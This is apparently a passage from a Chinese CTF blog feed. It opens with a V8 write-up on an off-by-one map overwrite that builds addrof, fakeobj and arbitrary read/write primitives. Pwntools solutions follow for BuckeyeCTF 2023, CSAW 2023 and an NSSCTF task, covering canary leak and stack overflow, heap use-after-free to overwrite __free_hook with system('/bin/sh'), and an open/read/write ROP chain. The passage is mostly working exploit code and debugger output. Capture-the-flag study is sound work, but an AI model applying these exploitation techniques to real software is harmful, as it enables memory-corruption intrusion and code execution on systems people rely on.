<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+BUILTIN(Myread) &#123;</span><br><span class="line">+  uint32_t len = args.length(); //获取参数数量</span><br><span class="line">+  if( len &gt; 1 ) return ReadOnlyRoots(isolate).undefined_value(); // 参数过多则返回undefined</span><br><span class="line">+  Handle&lt;JSReceiver&gt; receiver;	// 定义一个JSReceiver用来存储this</span><br><span class="line">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+         isolate, receiver, Object::ToObject(isolate,args.receiver())); // 将this参数转换为一个JSReceiver对象</span><br><span class="line">+  Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver); // 再将this转换为JSArray类型</span><br><span class="line">+  FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements()); // 提取出this的elements，将其视为浮点类型</span><br><span class="line">+  uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number()); // 提取出this的长度并转化为整形</span><br><span class="line">+  return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length))); // 返回elements的第length个值，但数组的范围是0-length-1，这里有off-by-one越界读</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+BUILTIN(Mywrite) &#123;</span><br><span class="line">+  uint32_t len = args.length(); </span><br><span class="line">+  if( len &gt; 2 ) return ReadOnlyRoots(isolate).undefined_value(); </span><br><span class="line">+  Handle&lt;JSReceiver&gt; receiver; </span><br><span class="line">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+         isolate, receiver, Object::ToObject(isolate,args.receiver()));</span><br><span class="line">+  Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+  FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="line">+  uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span><br><span class="line">+   </span><br><span class="line">+  if( len == 2) &#123;</span><br><span class="line">+    Handle&lt;Object&gt; value; </span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+            isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1))); // 将第一个参数(不this)转换为Number类型</span><br><span class="line">+    elements.set(length,value-&gt;Number()); // 将elements的第length个值设为value，同Myread，存在off-by-one越界写</span><br><span class="line">+    return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+  &#125;</span><br><span class="line">+  else&#123;</span><br><span class="line">+    return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+  &#125;</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，给出的补丁存在越界读写，根据上面提到的内存结构我们知道，elements的第length个值实际上为该对象的map，所以这两个函数分别可以读取map和写入map，接下来我们写个脚本进行测试。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var a=[1.3];</span><br><span class="line">var b=[a];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%DebugPrint(b);</span><br><span class="line">%SystemBreak();</span><br><span class="line">a.Mywrite(b.Myread());</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// var a=[1.3];</span><br><span class="line">0x1faf5120ddd1: [JSArray]</span><br><span class="line"> - map: 0x0125ead82ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1401ba251111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x1faf5120ddb9 &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x3a08c1800c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x0bb8ae2401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x1faf5120ddb9 &lt;FixedDoubleArray[1]&gt; &#123;</span><br><span class="line">           0: 1.3</span><br><span class="line"> &#125;</span><br><span class="line">// var b=[a];</span><br><span class="line">0x1faf5120de09: [JSArray]</span><br><span class="line"> - map: 0x0125ead82f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1401ba251111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x1faf5120ddf1 &lt;FixedArray[1]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x3a08c1800c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x0bb8ae2401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x1faf5120ddf1 &lt;FixedArray[1]&gt; &#123;</span><br><span class="line">           0: 0x1faf5120ddd1 &lt;JSArray[1]&gt;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到两个数组的map分别是浮点数和其他，在执行<code>a.Mywrite(b.Myread());</code>后如下，可以看到浮点数组的map确实改为了其他</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tele 0x1faf5120ddd0</span><br><span class="line">00:0000│  0x1faf5120ddd0 —▸ 0x125ead82f79 ◂— 0x400003a08c18001</span><br><span class="line">01:0008│  0x1faf5120ddd8 —▸ 0x3a08c1800c71 ◂— 0x3a08c18008</span><br><span class="line">02:0010│  0x1faf5120dde0 —▸ 0x1faf5120ddb9 ◂— 0x3a08c18014</span><br><span class="line">03:0018│  0x1faf5120dde8 ◂— 0x100000000</span><br><span class="line">04:0020│  0x1faf5120ddf0 —▸ 0x3a08c1800801 ◂— 0x3a08c18001</span><br><span class="line">05:0028│  0x1faf5120ddf8 ◂— 0x100000000</span><br><span class="line">06:0030│  0x1faf5120de00 —▸ 0x1faf5120ddd1 ◂— 0x7100000125ead82f</span><br><span class="line">07:0038│  0x1faf5120de08 —▸ 0x125ead82f79 ◂— 0x400003a08c18001</span><br><span class="line">pwndbg&gt; tele 0x1faf5120de08</span><br><span class="line">00:0000│  0x1faf5120de08 —▸ 0x125ead82f79 ◂— 0x400003a08c18001</span><br><span class="line">01:0008│  0x1faf5120de10 —▸ 0x3a08c1800c71 ◂— 0x3a08c18008</span><br><span class="line">02:0010│  0x1faf5120de18 —▸ 0x1faf5120ddf1 ◂— 0x3a08c18008</span><br><span class="line">03:0018│  0x1faf5120de20 ◂— 0x100000000</span><br><span class="line">04:0020│  0x1faf5120de28 —▸ 0x3a08c1800561 ◂— 0x200003a08c18001</span><br><span class="line">05:0028│  0x1faf5120de30 —▸ 0x125ead82f79 ◂— 0x400003a08c18001</span><br><span class="line">06:0030│  0x1faf5120de38 ◂— 0</span><br><span class="line">07:0038│  0x1faf5120de40 ◂— 0</span><br></pre></td></tr></table></figure>

<p>但是使用Myread读取的是浮点数，不便于观察，于是构造辅助函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var Buffer=new ArrayBuffer(0x10);</span><br><span class="line">var Float64=new Float64Array(Buffer);</span><br><span class="line">var BigUint64=new BigUint64Array(Buffer);</span><br><span class="line">function f2i(f)</span><br><span class="line">&#123;</span><br><span class="line">    Float64[0]=f;</span><br><span class="line">    return BigUint64[0];</span><br><span class="line">&#125;</span><br><span class="line">function i2f(i)</span><br><span class="line">&#123;</span><br><span class="line">    BigUint64[0]=i;</span><br><span class="line">    return Float64[0];</span><br><span class="line">&#125;</span><br><span class="line">function hex(i)</span><br><span class="line">&#123;</span><br><span class="line">    return i.toString(16);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="原语构造"><a href="#原语构造" class="headerlink" title="原语构造"></a>原语构造</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var float_array = [1.1];</span><br><span class="line">var float_array_map = float_array.Myread();</span><br><span class="line">var obj_array = [float_array];</span><br><span class="line">var obj_array_map = obj_array.Myread();</span><br></pre></td></tr></table></figure>

<p> 先构造一些基本的变量，方便之后使用</p>
<p>通过上述漏洞，我们思考如何利用</p>
<p>浮点数组和对象数组对属性的区别在于浮点数组中存储的是纯粹的数值，而对象数组中则是数值或指针。用下标均可访问，因此，有一种泄露对象地址的办法。<br>我们先将想泄露的对象<code>a</code>放入一个对象数组<code>b[]</code>内，将该对象数组<code>b[]</code>的map改为浮点数组，之后直接对对象数组<code>b[0]</code>的下标访问即可得到泄露的地址。<br>这就是构造一个原语</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function AddressOf(obj)</span><br><span class="line">&#123;</span><br><span class="line">    obj_array[0] = obj;</span><br><span class="line">    obj_array.Mywrite(float_array_map);</span><br><span class="line">    let addr = f2i(obj_array[0]);</span><br><span class="line">    obj_array.Mywrite(obj_array_map);//recover</span><br><span class="line">    return addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>类似地，也可以将一个内存地址伪造成一个对象，对该对象的访问也就是对特定内存地址的访问。<br>对于给定的内存地址a，先将其当作浮点数存入浮点数组，再将浮点数组将其改为对象数组，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function fakeobj(addr)&#123;</span><br><span class="line">    float_array[0] = i2f(addr+0x1n);</span><br><span class="line">    float_array.Mywrite(obj_array_map);</span><br><span class="line">    let obj = float_array[0];</span><br><span class="line">    float_array.Mywrite(float_array_map);</span><br><span class="line">    return obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在根据上面两个方法来尝试实现任意读写<br>对于一个已知的内存地址<code>rw_addr</code>，我们考虑以下方法：</p>
<p>伪造一个对象<code>fake_obj</code>，并使该对象的<code>elements</code>指向<code>rw_addr</code>的内存地址。<br>计算得到<code>elements=rw_addr+0x10</code><br>在起初，适合我们控制的应该是一个<code>PACKED_ELEMENTS</code>数组<code>fake_array</code>，在其内部设置<code>fake_obj</code>，可调试得到<code>fake_obj_addr=fake_array_addr-0x30</code>，创建<code>fake_obj</code>之后我们还可以通过<code>fake_array</code>修改<code>fake_obj</code>的<code>elements</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var fake_array=[</span><br><span class="line">    float_array_map,//map</span><br><span class="line">    0,//properties</span><br><span class="line">    i2f(0x1n),//element</span><br><span class="line">    i2f(0x100000000n),</span><br><span class="line">    1.1,</span><br><span class="line">    2.2</span><br><span class="line">];</span><br><span class="line">fake_obj_addr=AddressOf(fake_array)-0x30n;</span><br><span class="line">var fake_obj=fakeobj(fake_obj_addr);</span><br><span class="line">%DebugPrint(fake_obj);</span><br><span class="line">&gt; 0x095872e8ec19 &lt;JSArray[1]&gt;</span><br><span class="line">pwndbg&gt; tele 0x095872e8ec18</span><br><span class="line">00:0000│  0x95872e8ec18 —▸ 0x1e7fbe802ed9 ◂— 0x40000231b707c01</span><br><span class="line">01:0008│  0x95872e8ec20 ◂— 0</span><br><span class="line">02:0010│  0x95872e8ec28 ◂— 1</span><br><span class="line">03:0018│  0x95872e8ec30 ◂— 0x100000000</span><br><span class="line">04:0020│  0x95872e8ec38 ◂— 0x3ff199999999999a</span><br></pre></td></tr></table></figure>

<p>看gdb也能看出来是成功了，构造成函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function read(addr)&#123;</span><br><span class="line">    fake_array[2]=i2f(addr-0x10n+0x1n);</span><br><span class="line">    let leak_data=fake_obj[0];</span><br><span class="line">    console.log(&quot;[*] leak from: 0x&quot; +hex(addr) + &quot;: 0x&quot; + hex(leak_data));</span><br><span class="line"></span><br><span class="line">    return leak_data;</span><br><span class="line">&#125;</span><br><span class="line">function write(addr,data)&#123;</span><br><span class="line">    fake_array[2]=i2f(addr-0x10n+0x1n);</span><br><span class="line">    fake_obj[0]=i2f(data);</span><br><span class="line">    console.log(&quot;[*] write to: 0x&quot; + hex(addr) + &quot;: 0x&quot; + hex(data));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="如何getshell"><a href="#如何getshell" class="headerlink" title="如何getshell"></a>如何getshell</h2><p>这一段其实应该放到上面，不然前面的就跟没有路瞎走一样</p>
<p>传统堆栈上是system或者one_gadget，v8解释器本质上也是一个c++程序，所以按传统堆栈肯定是没毛病的<br>也是泄露出libc地址，然后改写hook函数就行<br>也有师傅找出了两种泄露方法<br>但是，但是……我主机现在是ubuntu24.04，glibc2.39，这个版本早就把hook函数移除了，真想打只能找其他办法，但是很难的辣<br>等过一个月换了个新硬盘我加装个ubuntu20再来战</p>
<p>但是那位师傅也提了关于写入问题的改进，在写高地址时出现问题。<br>原因是我们使用的write在写入时是用的FloatArray的写入，而Double类型的浮点数在处理7f开头的高地址时会出现将低20位与运算为0，从而导致写入失败的错误(可能是这个原因)<br>结果就是，直接用FloatArray方式向高地址写入会不成功。</p>
<p>解决办法：借助DataView对象</p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>v8</tag>
      </tags>
  </entry>
  <entry>
    <title>buckeyectf-2023</title>
    <url>/2023/10/10/buckeyectf-2023/</url>
    <content><![CDATA[<h1 id="Igpay-Atinlay-Natoriay"><a href="#Igpay-Atinlay-Natoriay" class="headerlink" title="Igpay Atinlay Natoriay"></a>Igpay Atinlay Natoriay</h1><p>给了一个rs文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use std::io::&#123;self, Read, BufRead&#125;;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let input = loop &#123;</span><br><span class="line">        match get_line() &#123;</span><br><span class="line">            Ok(my_str) =&gt; break my_str,</span><br><span class="line">            Err(_) =&gt; &#123;</span><br><span class="line">                print!(&quot;Try again.&quot;);</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    let mut output = String::new();</span><br><span class="line"></span><br><span class="line">    for word in input.split_whitespace() &#123;</span><br><span class="line">        let first = &amp;word[0..1];</span><br><span class="line">        let rest = &amp;word[1..];</span><br><span class="line"></span><br><span class="line">        output += rest;</span><br><span class="line">        output += first;</span><br><span class="line">        output += &quot;ay&quot;;</span><br><span class="line">        output += &quot; &quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    print!(&quot;&#123;output&#125;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn get_line() -&gt; Result&lt;String, io::Error&gt; &#123;</span><br><span class="line">    let mut input = String::new();</span><br><span class="line"></span><br><span class="line">    io::BufReader::new(io::stdin().take(1862)).read_line(&amp;mut input)?;</span><br><span class="line"></span><br><span class="line">    Ok(input)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>还有一个sh文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">./igpay-atinlay-natoriay-3000 \</span><br><span class="line">    || printf &quot;You crashed my program :(\n$FLAG&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到，当rust程序崩溃时就会打印出flag</p>
<p>再来分析rust程序，</p>
<p>允许我们输入一串字符串，同时将字符串的第一个字节移动到字符串的最后。</p>
<p>看起来是没有什么可利用的bug</p>
<p>但是rust是采用utf-8的，很明显，utf-8是一种变长编码，对于英文和常用的符号，确实是只有一个字节，但是对于中文和其他符号，就不止一个字节了。</p>
<p>那么在rust尝试分离一个字符的一个字节时，就会出现错误，从而导致程序崩溃。</p>
<p><img src="/2023/10/10/buckeyectf-2023/Snipaste_2023-10-10_10-52-20.png"></p>
<h1 id="bugsworld"><a href="#bugsworld" class="headerlink" title="bugsworld"></a>bugsworld</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line">context.arch=&quot;amd64&quot;</span><br><span class="line"></span><br><span class="line">r=process(&quot;./pwn&quot;)</span><br><span class="line">elf=ELF(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">def send_content(content):</span><br><span class="line">    r.recvuntil(b&quot;&gt; &quot;)</span><br><span class="line">    r.sendline(str(len(content)).encode())</span><br><span class="line">    r.recvuntil(b&quot;&gt; &quot;)</span><br><span class="line">    r.sendline(&quot; &quot;.join(str(x) for x in content).encode())</span><br><span class="line"></span><br><span class="line">send_content([(elf.sym[&quot;instruction_table&quot;]-elf.sym[&quot;instruction_names&quot;])//32])         #泄露出do_move</span><br><span class="line">#do_move_addr=u64(r.recvuntil(&quot;&quot;))</span><br><span class="line">do_move_addr=u64(r.recvuntil(&quot;I&quot;,drop=True).ljust(8,b&quot;\x00&quot;))</span><br><span class="line">print(&quot;do_move_addr---&gt;&quot;+hex(do_move_addr))</span><br><span class="line">base=do_move_addr-elf.sym[&quot;do_move&quot;]</span><br><span class="line">win_addr=base+elf.sym[&quot;win&quot;]</span><br><span class="line">win_pointer_addr=(elf.sym[&quot;bytecode&quot;]+4*8-elf.sym[&quot;instruction_table&quot;])//8</span><br><span class="line">send_content([6,3,28,win_pointer_addr,win_addr])#将win_addr存放在bytecode[4]</span><br><span class="line">send_content([6,3])#利用do_jump,使table[code[]]指向win_addr并执行，从而获取到flag</span><br><span class="line">r.recvall(timeout=1)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>csaw_2023_qual</title>
    <url>/2023/09/22/csaw-2023-qual/</url>
    <content><![CDATA[<h1 id="unlimited-subway"><a href="#unlimited-subway" class="headerlink" title="unlimited_subway"></a>unlimited_subway</h1><p>32位程序，开启了canary，有一个可以任意栈溢出的漏洞和一个任意读</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void __cdecl view_account(unsigned __int8 *account, int idx)</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;Index %d : %02x\n&quot;, idx, account[idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(&quot;Name Size : &quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;name_len);</span><br><span class="line">  printf(&quot;Name : &quot;);</span><br><span class="line">  read(0, name, name_len);</span><br></pre></td></tr></table></figure>

<p>可通过任意读泄露canary，再进行溢出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&quot;i386&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span><br><span class="line">r=process(&quot;./pwn&quot;)</span><br><span class="line">elf=ELF(&quot;./pwn&quot;)</span><br><span class="line">canary=b&#x27;&#x27;</span><br><span class="line">#leak_canary</span><br><span class="line">for i in range(131,127,-1):</span><br><span class="line"></span><br><span class="line">    r.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">    r.sendline(&quot;V&quot;)</span><br><span class="line">    r.recvuntil(&quot;Index : &quot;)</span><br><span class="line">    r.sendline(str(i))</span><br><span class="line"></span><br><span class="line">    r.recvuntil(&quot;Index &quot;+str(i)+&quot; : &quot;)</span><br><span class="line">    canary+=r.recv(2)</span><br><span class="line">print(canary)</span><br><span class="line">canary=int(canary,16)</span><br><span class="line">r.sendline(&quot;E&quot;)</span><br><span class="line">r.sendlineafter(&quot;Name Size : &quot;,&quot;76&quot;)</span><br><span class="line">payload=b&quot;a&quot;*64+p32(canary)*2+p32(0x8049304)</span><br><span class="line">r.sendlineafter(&quot;Name : &quot;,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="Super-Secure-Heap"><a href="#Super-Secure-Heap" class="headerlink" title="Super_Secure_Heap"></a>Super_Secure_Heap</h1><p>实现了利用RC4加密内容</p>
<p>可自定义创建key，也可自定义插入指定内容，但内容会被用key加密，同时也有UAF漏洞</p>
<blockquote>
<p>RC4加密，是一种对称加密算法。RC4由伪随机数生成器和异或运算组成。RC4的密钥长度可变，范围是[1,255]。RC4一个字节一个字节地加解密。给定一个密钥，伪随机数生成器接受密钥并产生一个S盒。S盒用来加密数据，而且在加密过程中S盒会变化。</p>
<p>由于异或的对合性，RC4的加密解密算法一致</p>
<p>也就是说，使用相同的密钥进行两次加密操作会得到原始明文</p>
</blockquote>
<p>可使用python中的rc4库来进行首次加密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from rc4 import rc4</span><br><span class="line"></span><br><span class="line">context(arch=&quot;amd64&quot;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">r=process(&quot;./pwn&quot;)</span><br><span class="line">elf=process(&quot;./pwn&quot;)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line">RECV=&quot;&gt;&quot;</span><br><span class="line"></span><br><span class="line">sla = lambda x,y :r.sendlineafter(x,y)</span><br><span class="line">sl = lambda x :r.sendline(x)</span><br><span class="line">s = lambda x :r.send(x)</span><br><span class="line">sa = lambda x,y :r.sendafter(x,y)</span><br><span class="line">rr = lambda  : r.recv()</span><br><span class="line">rrx = lambda x : r.recv(x)</span><br><span class="line">ru = lambda x : r.recvuntil(x)</span><br><span class="line">rl = lambda : r.recvline()</span><br><span class="line">ra = lambda x : r.recvall(timeout=x)</span><br><span class="line">mode=&quot;k&quot;</span><br><span class="line">KEY=b&quot;12345678&quot;</span><br><span class="line"></span><br><span class="line">def add(size):</span><br><span class="line">    if mode==&quot;k&quot;:</span><br><span class="line">        sla(RECV,&quot;1&quot;)</span><br><span class="line">    else:</span><br><span class="line">        sla(RECV, &quot;2&quot;)</span><br><span class="line">    sla(RECV, &quot;1&quot;)</span><br><span class="line">    sla(&quot;:&quot;, str(size))</span><br><span class="line"></span><br><span class="line">def set(idx,content=b&quot;&quot;):</span><br><span class="line">    if mode==&quot;k&quot;:</span><br><span class="line">        sla(RECV,&quot;1&quot;)</span><br><span class="line">        sla(RECV,&quot;3&quot;)</span><br><span class="line">        sla(&quot;:&quot;,str(idx))</span><br><span class="line">        sla(&quot;:&quot;,str(len(content)).encode())</span><br><span class="line">        sa(&quot;:&quot;,content)</span><br><span class="line">    else:</span><br><span class="line">        sla(RECV,&quot;2&quot;)</span><br><span class="line">        sla(RECV,&quot;3&quot;)</span><br><span class="line">        sla(&quot;:&quot;,str(idx))</span><br><span class="line">        sla(&quot;:&quot;,str(0))</span><br><span class="line">        sla(&quot;:&quot;,str(len(content)).encode())</span><br><span class="line">        sa(&quot;:&quot;,content)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    if mode==&quot;k&quot;:</span><br><span class="line">        sla(RECV,&quot;1&quot;)</span><br><span class="line">    else:</span><br><span class="line">        sla(RECV,&quot;2&quot;)</span><br><span class="line">    sla(RECV,&quot;2&quot;)</span><br><span class="line">    sla(&quot;:&quot;,str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    if mode == &quot;k&quot;:</span><br><span class="line">        sla(RECV, &quot;1&quot;)</span><br><span class="line">    else:</span><br><span class="line">        sla(RECV, &quot;2&quot;)</span><br><span class="line">    sla(RECV,&quot;4&quot;)</span><br><span class="line">    sla(&quot;:&quot;,str(idx))</span><br><span class="line">    ru(&quot;content: \n&quot;)</span><br><span class="line">    return rrx(6)</span><br><span class="line"></span><br><span class="line">#create key</span><br><span class="line">mode=&quot;k&quot;</span><br><span class="line">add(0x20)</span><br><span class="line">set(0,KEY)</span><br><span class="line"></span><br><span class="line">#leak libc</span><br><span class="line">mode=&quot;c&quot;</span><br><span class="line">add(0x410)#0</span><br><span class="line">add(0x20)#1</span><br><span class="line">add(0x20)#2</span><br><span class="line">add(0x20)#3</span><br><span class="line">delete(0)</span><br><span class="line">main_arena=u64(show(0).ljust(8,b&quot;\x00&quot;))-96</span><br><span class="line">print(hex(main_arena))</span><br><span class="line">libc.address=main_arena-0x1ecb80</span><br><span class="line">print(hex(libc.address))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_hook=libc.address+0x1eee48</span><br><span class="line">system=libc.address+0x52290</span><br><span class="line"></span><br><span class="line">#对要插入content的值处理，使其再进行rc4加密时会恢复到原本的样子，rc4的加密和解密方式是相同的</span><br><span class="line">enc_free_hook=rc4(KEY).encrypt(p64(free_hook))</span><br><span class="line">enc_bin_sh=rc4(KEY).encrypt(b&quot;/bin/sh\0&quot;)</span><br><span class="line">enc_system=rc4(KEY).encrypt(p64(system))</span><br><span class="line">log.info(f&quot;__free_hook encrypted: &#123;enc_free_hook.hex()&#125;&quot;)</span><br><span class="line">log.info(f&quot;/bin/sh encrypted: &#123;enc_bin_sh.hex()&#125;&quot;)</span><br><span class="line">log.info(f&quot;system encrypted: &#123;enc_system.hex()&#125;&quot;)</span><br><span class="line">#利用content中的UAF</span><br><span class="line"></span><br><span class="line">mode=&quot;c&quot;</span><br><span class="line">delete(3)</span><br><span class="line">delete(2)</span><br><span class="line">delete(1)</span><br><span class="line">set(1,enc_free_hook)</span><br><span class="line">set(2,enc_bin_sh)</span><br><span class="line">add(0x20)#4</span><br><span class="line">add(0x20)#5,free</span><br><span class="line">set(5,enc_system)</span><br><span class="line">delete(2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/osirislab/CSAW-CTF-2023-Quals/tree/main/pwn">CSAW-CTF-2023-Quals&#x2F;pwn at main · osirislab&#x2F;CSAW-CTF-2023-Quals (github.com)</a></p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>intorw</title>
    <url>/2023/10/12/intorw/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">r=process(&quot;./pwn&quot;)</span><br><span class="line">r=remote(&quot;node5.anna.nssctf.cn&quot;,28360)</span><br><span class="line">elf=ELF(&quot;./pwn&quot;)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line">pop_rdi=0x0000000000400ad3</span><br><span class="line">pop_rsi_r15=0x0000000000400ad1</span><br><span class="line">ret=0x0000000000400726</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[&quot;puts&quot;]</span><br><span class="line">puts_got=elf.got[&quot;puts&quot;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendlineafter(&quot;read\n&quot;,&quot;-1&quot;)</span><br><span class="line">payload=b&#x27;a&#x27;*0x28</span><br><span class="line">payload+=p64(pop_rdi)+p64(puts_got)+p64(0x400760)+p64(elf.sym[&quot;vuln&quot;])</span><br><span class="line">r.sendlineafter(&quot;read:\n&quot;,payload)</span><br><span class="line">libc.address=u64(r.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))-libc.sym[&quot;puts&quot;]</span><br><span class="line">print(hex(libc.address))</span><br><span class="line"></span><br><span class="line">read_addr=libc.sym[&quot;read&quot;]</span><br><span class="line">open_addr=libc.sym[&quot;open&quot;]</span><br><span class="line">puts_addr=libc.sym[&quot;puts&quot;]</span><br><span class="line">write_addr=libc.sym[&quot;write&quot;]</span><br><span class="line"></span><br><span class="line">flag_addr=0x601046</span><br><span class="line">pop_rdi=libc.address+0x000000000002a3e5</span><br><span class="line">pop_rsi=libc.address+0x000000000002be51</span><br><span class="line">pop_rdx_r12=libc.address+0x000000000011f497</span><br><span class="line">buf_addr=0x601000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendline(&quot;-1&quot;)</span><br><span class="line">payload=b&quot;a&quot;*0x28+p64(pop_rdi)+p64(libc.sym.__environ)+p64(0x400760)+p64(elf.sym[&quot;vuln&quot;])</span><br><span class="line">r.sendlineafter(&quot;read:\n&quot;,payload)</span><br><span class="line">environ_addr=u64(r.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))</span><br><span class="line">print(hex(environ_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=b&quot;a&quot;*0x28</span><br><span class="line">payload+=p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(open_addr)</span><br><span class="line">payload+=p64(pop_rdi)+p64(0x3)+p64(pop_rsi)+p64(buf_addr)+p64(pop_rdx_r12)+p64(0x30)*2+p64(read_addr)</span><br><span class="line">payload+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(buf_addr)+p64(pop_rdx_r12)+p64(0x30)*2+p64(write_addr)+b&quot;/flag&quot;</span><br><span class="line">r.sendline(&quot;-1&quot;)</span><br><span class="line">gdb.attach(r,&quot;b read&quot;)</span><br><span class="line">pause()</span><br><span class="line">r.sendafter(&quot;read:\n&quot;,payload)</span><br><span class="line"></span><br><span class="line">r.recvall()</span><br><span class="line"></span><br><span class="line">#open(&quot;./flag&quot;)</span><br><span class="line">#read(3,buf,0x30)</span><br><span class="line">#puts(buf)</span><br><span class="line">#write(1,buf,0x30)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>heroctf-2024</title>
    <url>/2024/11/22/hero-ctf/</url>
    <content><![CDATA[<h1 id="Bankrupst"><a href="#Bankrupst" class="headerlink" title="Bankrupst"></a>Bankrupst</h1><p>简单的UAF+Rust</p>
